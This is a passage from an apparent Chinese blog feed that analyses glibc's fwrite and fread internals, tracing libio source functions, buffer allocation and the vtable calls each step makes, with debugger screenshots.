class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">    count = to_do;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      <span class="built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      f-&gt;_IO_write_ptr += count;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_size_t block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line">    <span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">       caller that everything has been written.  */</span></span><br><span class="line">    <span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class="line">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_write)</span><br><span class="line">    &#123;</span><br><span class="line">      count = new_do_write (f, s, do_write);</span><br><span class="line">      to_do -= count;</span><br><span class="line">      <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">        <span class="keyword">return</span> n - to_do;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment">     buffer, but it&#x27;s somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment">     so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)</span><br><span class="line">    to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn)</span><br></pre></td></tr></table></figure><p>刚fopen完此时大部分字段位NULL</p><img src="/2023/04/01/IO-FILE-fwrite/image-20230401153712485.png" alt="image-20230401153712485" style="zoom:80%;"><p>前面几个if都不成立，来到<code> if (to_do + must_flush &gt; 0)</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br></pre></td></tr></table></figure><p><mark>&#x3D;&#x3D;调用虚表中的__overflow，即_IO_new_file_overflow函数，第一参数_IO_FILE文件流结构体，第二个参数 EOF(-1)&#x3D;&#x3D;<mark></mark></mark></p><h2 id="申请并初始化缓冲区，文件流结构体完善"><a href="#申请并初始化缓冲区，文件流结构体完善" class="headerlink" title="申请并初始化缓冲区，文件流结构体完善"></a>申请并初始化缓冲区，文件流结构体完善</h2><h4 id="x2F-libio-x2F-fileops-c-IO-new-file-overflow"><a href="#x2F-libio-x2F-fileops-c-IO-new-file-overflow" class="headerlink" title="&#x2F;libio&#x2F;fileops.c _IO_new_file_overflow"></a><strong>&#x2F;libio&#x2F;fileops.c</strong> _IO_new_file_overflow</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_new_file_overflow (_IO_FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_doallocbuf (f);</span><br><span class="line">      _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">     If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">     logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">     read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">     makes room for subsequent output.</span></span><br><span class="line"><span class="comment">     Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">     alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">      _IO_free_backup_area (f);</span><br><span class="line">      f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">                   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">      f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">    f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">    f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">              f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)</span><br></pre></td></tr></table></figure><p>先判断文件流结构体flag是不是有不可写属性返回EOF</p><p>检测受否有_IO_CURRENTLY_PUTTING或_IO_write_base是否为空</p><blockquote><p>IO_CURRENTLY_PUTTING是GNU C库中使用的宏，用于表示FILE流当前写入数据的输出缓冲区位置。它的定义如下：</p><p>#define IO_CURRENTLY_PUTTING(fp) ((fp)-&gt;_IO_write_ptr - (fp)-&gt;_IO_write_base)</p></blockquote><p>IO_write_base为空符合条件调用_IO_doallocbuf分配缓冲区，fwrite分析过</p><p><mark>&#x3D;&#x3D;调用虚表中的__doallocate指向的_IO_file_doallocate函数&#x3D;&#x3D;<mark></mark></mark></p><img src="/2023/04/01/IO-FILE-fwrite/image-20230401162158010.png" alt="image-20230401162158010" style="zoom: 80%;"><p>接下来的_IO_setg也在fread里分析过_</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_setg(fp, eb, g, eg)  ((fp)-&gt;_IO_read_base = (eb),\</span></span><br><span class="line"><span class="meta">    (fp)-&gt;_IO_read_ptr = (g), (fp)-&gt;_IO_read_end = (eg))</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">((fp)-&gt;_IO_read_base = (fp-&gt;_IO_buf_base), (fp)-&gt;_IO_read_ptr = (fp-&gt;_IO_buf_base), (fp)-&gt;_IO_read_end = (fp-&gt;_IO_buf_base));</span><br></pre></td></tr></table></figure><p>_也就是把结构体里的<strong>read</strong>相关的3个指针均初始化为IO_buf_base</p><img src="/2023/04/01/IO-FILE-fwrite/image-20230401164402279.png" alt="image-20230401164402279" style="zoom:80%;"><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_in_backup(fp) ((fp)-&gt;_flags &amp; _IO_IN_BACKUP)</span></span><br></pre></td></tr></table></figure><p>_IO_in_backup这里不成立，来到给fp的write相关指针赋值，并设置_IO_CURRENTLY_PUTTING 属性，用于表示当前正在执行输出操作</p><img src="/2023/04/01/IO-FILE-fwrite/image-20230401171509678.png" alt="image-20230401171509678" style="zoom:80%;"><h2 id="根据处理数据大小和缓冲区大小决定往缓冲区里写数据或直接写入文件"><a href="#根据处理数据大小和缓冲区大小决定往缓冲区里写数据或直接写入文件" class="headerlink" title="根据处理数据大小和缓冲区大小决定往缓冲区里写数据或直接写入文件"></a>根据处理数据大小和缓冲区大小决定往缓冲区里写数据或直接写入文件</h2><p>ch&#x3D;EOF(-1),执行_IO_do_write(f, f-&gt;_IO_write_base,f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</p><h5 id="x2F-libio-x2F-fileops-c中-IO-new-do-write"><a href="#x2F-libio-x2F-fileops-c中-IO-new-do-write" class="headerlink" title="&#x2F;libio&#x2F;fileops.c中**_IO_new_do_write**"></a><strong>&#x2F;libio&#x2F;fileops.c</strong>中**_IO_new_do_write**</h5><p>函数第一个参数_IO_FILE文件流结构体，第二个参数输出缓冲区，第三个参数为0</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_new_do_write _IO_do_write</span></span><br><span class="line">_IO_new_do_write (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">      || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>todo&#x3D;&#x3D;0成立，直接返回0，回到**_IO_new_file_xsputn**函数</p><p><code>if (_IO_OVERFLOW (f, EOF) == EOF)</code>不成立</p><p>设置blocksize为申请的缓冲区大小</p><p><strong>do_write</strong>根据<code>do_write = to_do - (block_size &gt;= 128 ? to_do % block_size : 0);</code>赋值</p><h4 id="fwrite写入大小参数小于申请的缓冲区大小，一般最多为4k，本测试为1k"><a href="#fwrite写入大小参数小于申请的缓冲区大小，一般最多为4k，本测试为1k" class="headerlink" title="fwrite写入大小参数小于申请的缓冲区大小，一般最多为4k，本测试为1k"></a>fwrite写入大小参数小于申请的缓冲区大小，一般最多为4k，本测试为1k</h4><p>do_write为0</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (to_do)</span><br><span class="line">    to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br></pre></td></tr></table></figure><p>调用<strong>libio&#x2F;genops.c</strong>的_IO_default_xsputn第一个参数为文件流结构体，第二个参数为内存数据起始点，第三个为输入大小size*count</p><p><img src="/2023/04/01/IO-FILE-fwrite/image-20230401175400733.png" alt="image-20230401175400733"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_default_xsputn (_IO_FILE *f, <span class="type">const</span> <span class="type">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">char</span> *) data;</span><br><span class="line">  _IO_size_t more = n;</span><br><span class="line">  <span class="keyword">if</span> (more &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Space available. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_ptr &lt; f-&gt;_IO_write_end)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_size_t count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; more)</span><br><span class="line">        count = more;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">        &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">          f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">          <span class="built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">          f-&gt;_IO_write_ptr += count;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">          s += count;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (count)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">char</span> *p = f-&gt;_IO_write_ptr;</span><br><span class="line">          _IO_ssize_t i;</span><br><span class="line">          <span class="keyword">for</span> (i = count; --i &gt;= <span class="number">0</span>; )</span><br><span class="line">        *p++ = *s++;</span><br><span class="line">          f-&gt;_IO_write_ptr = p;</span><br><span class="line">        &#125;</span><br><span class="line">      more -= count;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="keyword">if</span> (more == <span class="number">0</span> || _IO_OVERFLOW (f, (<span class="type">unsigned</span> <span class="type">char</span>) *s++) == EOF)</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">      more--;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_default_xsputn)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果要输入的数据小于缓冲区大小则把输入大小置为输入真实数据大小，否则按照缓冲区大小</p><ul><li><p>一次转移大于20时</p><ul><li>采用memcopy，进行传输</li></ul></li><li><p>一次转移大小小于20时</p><ul><li>采用for循环进行赋值</li></ul></li></ul><p>缓冲区不够时会_IO_OVERFLOW刷新缓冲区</p><p><img src="/2023/04/01/IO-FILE-fwrite/image-20230401182422401.png" alt="image-20230401182422401"></p><h4 id="fwrite写入大小参数大于等于申请的缓冲区大小，一般最多为4k，本测试为1k"><a href="#fwrite写入大小参数大于等于申请的缓冲区大小，一般最多为4k，本测试为1k" class="headerlink" title="fwrite写入大小参数大于等于申请的缓冲区大小，一般最多为4k，本测试为1k"></a>fwrite写入大小参数大于等于申请的缓冲区大小，一般最多为4k，本测试为1k</h4><p>do_write为缓冲区大小的倍数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (do_write)&#123;</span><br><span class="line">      count = new_do_write (f, s, do_write);</span><br><span class="line">      to_do -= count;</span><br><span class="line">      <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">        <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>libio&#x2F;fileops.c</strong></p><p>new_do_write第一个参数为文件流结构体，第二个参数为内存数据起始点，第三个为输入大小do_write</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span></span><br><span class="line">_IO_size_t</span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span></span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">    = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">               &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">               ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先检测_IO_IS_APPENDING标志位它表示文件流的当前位置是否处于文件的末尾，并且文件以”追加模式”打开。</p><p>fp-&gt;_IO_read_end !&#x3D; fp-&gt;_IO_write_base不相等时会_IO_SYSSEEK()</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_SYSSEEK(FP, OFFSET, MODE) JUMP2 (__seek, FP, OFFSET, MODE)</span></span><br></pre></td></tr></table></figure><p><mark>&#x3D;&#x3D;调用虚表里的seek对应的__GI__IO_file_seek&#x3D;&#x3D;<mark></mark></mark></p><p>不过条件不成立，直接调用_IO_SYSWRITE</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_SYSWRITE(FP, DATA, LEN) JUMP2 (__write, FP, DATA, LEN)</span></span><br></pre></td></tr></table></figure><p><mark>&#x3D;&#x3D;调用了vtable中__write对应的<code>_IO_new_file_write</code>&#x3D;&#x3D;<mark></mark></mark></p><p><strong>libio&#x2F;fileops.c</strong>中**_IO_new_file_write**</p><p>第一个参数为文件流结构体，第二个参数为内存数据起始点，第三个为输入大小do_write</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_new_file_write (_IO_FILE *f, <span class="type">const</span> <span class="type">void</span> *data, _IO_ssize_t n)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_ssize_t to_do = n;</span><br><span class="line">  <span class="keyword">while</span> (to_do &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_ssize_t count = (__builtin_expect (f-&gt;_flags2</span><br><span class="line">                         &amp; _IO_FLAGS2_NOTCANCEL, <span class="number">0</span>)</span><br><span class="line">               ? write_not_cancel (f-&gt;_fileno, data, to_do)</span><br><span class="line">               : write (f-&gt;_fileno, data, to_do));</span><br><span class="line">      <span class="keyword">if</span> (count &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      to_do -= count;</span><br><span class="line">      data = (<span class="type">void</span> *) ((<span class="type">char</span> *) data + count);</span><br><span class="line">    &#125;</span><br><span class="line">  n -= to_do;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_offset &gt;= <span class="number">0</span>)</span><br><span class="line">    f-&gt;_offset += n;</span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行系统调用write把数据写入文件，</p><p>调用_IO_adjust_column更新文件流结构体中的_cur_column</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span></span><br><span class="line">_IO_adjust_column (<span class="type">unsigned</span> start, <span class="type">const</span> <span class="type">char</span> *line, <span class="type">int</span> count)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *ptr = line + count;</span><br><span class="line">  <span class="keyword">while</span> (ptr &gt; line)</span><br><span class="line">    <span class="keyword">if</span> (*--ptr == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">      <span class="keyword">return</span> line + count - ptr - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> start + count;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_adjust_column)</span><br></pre></td></tr></table></figure><p>朴素的通过检测‘\n’来统计增加的行数</p><p>未对齐的数据回到 <strong>_IO_default_xsputn</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> (to_do)</span><br><span class="line">to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>调用_IO_default_xsputn，和&lt;的一样进入缓冲区</p><p><strong>哎呀你干嘛，突然意识到，小于缓冲区的大小的数据只是被送进了缓冲区，没有被写入文件啊。。。别急还有fclose没有分析，谁知道未来的fclose会发生什么呢</strong></p><h2 id="fwrite-函数调用的vtable函数"><a href="#fwrite-函数调用的vtable函数" class="headerlink" title="fwrite 函数调用的vtable函数"></a>fwrite 函数调用的vtable函数</h2><ul><li><code>_IO_fwrite</code>函数调用了vtable的<code>_IO_new_file_xsputn</code>。</li><li><code>_IO_new_file_xsputn</code>函数调用了vtable中的<code>_IO_new_file_overflow</code>实现缓冲区的建立以及刷新缓冲区。</li><li>vtable中的<code>_IO_new_file_overflow</code>函数调用了vtable的<code>_IO_file_doallocate</code>以初始化输入缓冲区。</li><li>vtable中的<code>_IO_file_doallocate</code>调用了vtable中的<code>__GI__IO_file_stat</code>以获取文件信息。</li><li><code>new_do_write</code>中的<code>_IO_SYSWRITE</code>调用了vtable<code>_IO_new_file_write</code>最终去执行系统调用write。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> IO FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO FILE fread</title>
      <link href="/2023/03/31/IO-FILE-fread/"/>
      <url>/2023/03/31/IO-FILE-fread/</url>
      
        <content type="html"><![CDATA[<h2 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h2><p>首先感谢一下ray-cp师傅的文章 <a href="https://www.anquanke.com/post/id/177958#h2-5">https://www.anquanke.com/post/id/177958#h2-5</a></p><p>测试程序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">20</span>];</span><br><span class="line">    FILE*fp=fopen(<span class="string">&quot;./text&quot;</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    fread(data,<span class="number">1</span>,<span class="number">20</span>,fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fread</span> <span class="params">( <span class="type">void</span> *buffer, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE *stream)</span> ;</span><br></pre></td></tr></table></figure><p><strong>libio&#x2F;iofread.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">weak_alias(_IO_fread , fread);</span><br></pre></td></tr></table></figure><p><strong>_IO_fread</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_fread (<span class="type">void</span> *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t bytes_requested = size * count;</span><br><span class="line">  _IO_size_t bytes_read;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (bytes_requested == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  bytes_read = _IO_sgetn (fp, (<span class="type">char</span> *) buf, bytes_requested);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="keyword">return</span> bytes_requested == bytes_read ? count : bytes_read / size;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_fread)</span><br></pre></td></tr></table></figure><p>首先CHECK_FILE检测fp合法性</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> IO_DEBUG</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> CHECK_FILE(FILE, RET) \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> ((FILE) == NULL) &#123; MAYBE_SET_EINVAL; return RET; &#125; \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> &#123; COERCE_FILE(FILE); \</span></span><br><span class="line"><span class="meta">           <span class="keyword">if</span> (((FILE)-&gt;_IO_file_flags &amp; _IO_MAGIC_MASK) != _IO_MAGIC) \</span></span><br><span class="line"><span class="meta">      &#123; MAYBE_SET_EINVAL; return RET; &#125;&#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> CHECK_FILE(FILE, RET) COERCE_FILE (FILE)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>如果定义了IO_DEBUG</p><p>FILE为空直接返回，否则检测FILE的flag魔数是否匹配</p><p>回到_IO_fread进行加锁后调用_IO_sgetn</p><p><strong>libio&#x2F;genops.c</strong></p><p>_IO_sgetn</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_sgetn (_IO_FILE *fp, <span class="type">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* FIXME handle putback buffer here! */</span></span><br><span class="line">  <span class="keyword">return</span> _IO_XSGETN (fp, data, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>libio&#x2F;libioP.h</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) _IO_JUMPS_FILE_plus (THIS)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FILE_plus(THIS) \</span></span><br><span class="line"><span class="meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, 